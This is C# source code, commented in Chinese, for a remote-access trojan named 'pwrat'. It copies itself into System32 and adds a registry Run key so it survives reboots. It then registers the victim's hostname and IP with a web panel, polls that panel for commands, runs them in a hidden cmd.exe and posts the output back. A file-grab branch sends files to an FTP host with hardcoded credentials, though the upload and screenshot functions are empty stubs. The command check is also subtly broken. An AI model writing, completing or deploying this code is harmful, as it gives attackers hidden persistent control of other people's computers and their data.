// B/S远控server端 一个进程 by PortWatcher

using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Management;
using System.Net;
using System.IO;
using System.Threading;
using System.Diagnostics;
using System.Collections.Specialized;
using Microsoft.Win32;
using System.Windows.Forms;

namespace pwrat
{
    class pwrat
    {
        //实现开机自动启动
        public static bool SetAutoRun(string keyName, string filePath)
        {

            object key = Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", "pwrat", null);
            if (key != null)
            {
                //移动至C://WINNT/system32
                string sourceFile = Application.StartupPath + "\\pwrat.exe";
                Console.WriteLine("{0}", sourceFile);
                string destinationFile = filePath;
                Console.WriteLine("{0}", filePath);
                File.Move(sourceFile, destinationFile);

                //开机启动
                try
                {
                    RegistryKey runKey = Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
                    runKey.SetValue(keyName, filePath);
                    runKey.Close();
                }
                catch
                {
                    return false;
                }
                return true;
            }
            else
            {
                return true;
            }
        }


        //执行CMD命令
        public static string Runcmd(string torun)
        {
            //开辟一个独立进程
            Process cmd = new Process();
            cmd.StartInfo.FileName = "cmd.exe";
            //重要的属性设置
            cmd.StartInfo.UseShellExecute = false;
            cmd.StartInfo.RedirectStandardInput = true;
            cmd.StartInfo.RedirectStandardOutput = true;
            cmd.StartInfo.RedirectStandardError = true;
            cmd.StartInfo.CreateNoWindow = true;
            //开始进程
            cmd.Start();
            cmd.StandardInput.WriteLine("{0}", torun);
            cmd.StandardInput.WriteLine("exit");
            string strRst = cmd.StandardOutput.ReadToEnd();
            return strRst;
        }



        //FTP上传文件
        private static void FtpUpload(string souceFile, string host, string username, string password)
        {

        
        }

        
        //截屏并PUT上传截屏图片
        private static void ScreenCapture()
        {
            ;
        }


        //实现POST提交数据
        private static void PostWebRequest(string postUrl, string postData)
        {
            WebClient myWebClient = new WebClient();
            NameValueCollection myNameValueCollection = new NameValueCollection();
            myNameValueCollection.Add("output", postData);
            byte[] responseArray = myWebClient.UploadValues(postUrl, "POST", myNameValueCollection);


            /*byte[] byteArray = dataEncode.GetBytes(paramData); //转化
            HttpWebRequest webReq = (HttpWebRequest)WebRequest.Create(new Uri(postUrl));
            webReq.Method = "POST";
            webReq.ContentType = "application/x-www-form-urlencoded";

            webReq.ContentLength = byteArray.Length;
            Stream newStream = webReq.GetRequestStream();
            newStream.Write(byteArray, 0, byteArray.Length);//写入参数
            newStream.Close();
            HttpWebResponse response = (HttpWebResponse)webReq.GetResponse();
            StreamReader sr = new StreamReader(response.GetResponseStream(), Encoding.Default);
            //ret = sr.ReadToEnd();
            sr.Close();
            response.Close();
            newStream.Close();
            //return ret;*/
        }




        public static int Main()
        {
            //开机自动启动，将自动判断注册表是否已存在自启动键值
            SetAutoRun("pwrat", "C:\\Windows\\System32\\pwrat.exe");


            //获取内网和外网IP地址
            string ip = "";
            IPHostEntry me = Dns.GetHostEntry(Dns.GetHostName());
            foreach (IPAddress ipall in me.AddressList)
            {
                ip += ipall.ToString();
                ip += "/";
            }

            //获取主机名
            string hostname = Dns.GetHostName();

            string id = "0";

            //向web端注册一个id
            while (id == "0")
            {
                string reguri = "http://www.yoursite.com/connect.php?name=" + hostname + "&ip=" + ip;
                HttpWebRequest request = (HttpWebRequest)WebRequest.Create(reguri);
                HttpWebResponse response = (HttpWebResponse)request.GetResponse();
                Stream stream = response.GetResponseStream();
                StreamReader strRe = new StreamReader(stream, Encoding.UTF8);
                id = strRe.ReadToEnd().ToString();
                request.Abort();
                response.Close();
                Thread.Sleep(3000);
            }



            //将web端分配的id提交给WEB，获得需要执行的命令
            string cmd = "";
            while (id != "0")
            {
                string cmduri = "http://www.yoursite.com/cmd.php?id=" + id;
                HttpWebRequest cmdreq = (HttpWebRequest)WebRequest.Create(cmduri);
                HttpWebResponse cmdreps = (HttpWebResponse)cmdreq.GetResponse();

                Stream cmdstr = cmdreps.GetResponseStream();
                StreamReader strcmdRe = new StreamReader(cmdstr, Encoding.UTF8);
                cmd = strcmdRe.ReadToEnd().ToString();
                cmdreps.Close();
                strcmdRe.Close();
                //执行命令，do_nothing表示什么也不做
                string output = "";
                /*switch (cmd)
                {
                    case "do_nothing":Thread.Sleep(3000);break;
                    default: output = Runcmd(cmd); break;
                }*/
                if (cmd == "do_nothing") Thread.Sleep(3000);
                else if((cmd[0] + cmd[1] + cmd[2] + cmd[3] + cmd[4] + cmd[5] + cmd[6] + cmd[7]).ToString() == "GetFile")
                {
                    string file = cmd.Replace("GetFile","");
                    FtpUpload(file,"www.hackyou.tk","pwh4ck","xiaoyin521!");
                }
                else if (cmd == "SCREEN")
                {
                    
                }
                else output = Runcmd(cmd);


                //将命令的回显结果以POST方式返回给web端
                if (output != "")
                {
                    PostWebRequest("http://www.yousite.com/cmd.php", output);
                }
                Thread.Sleep(3000);
            }


            return 0;
        }
    }
}
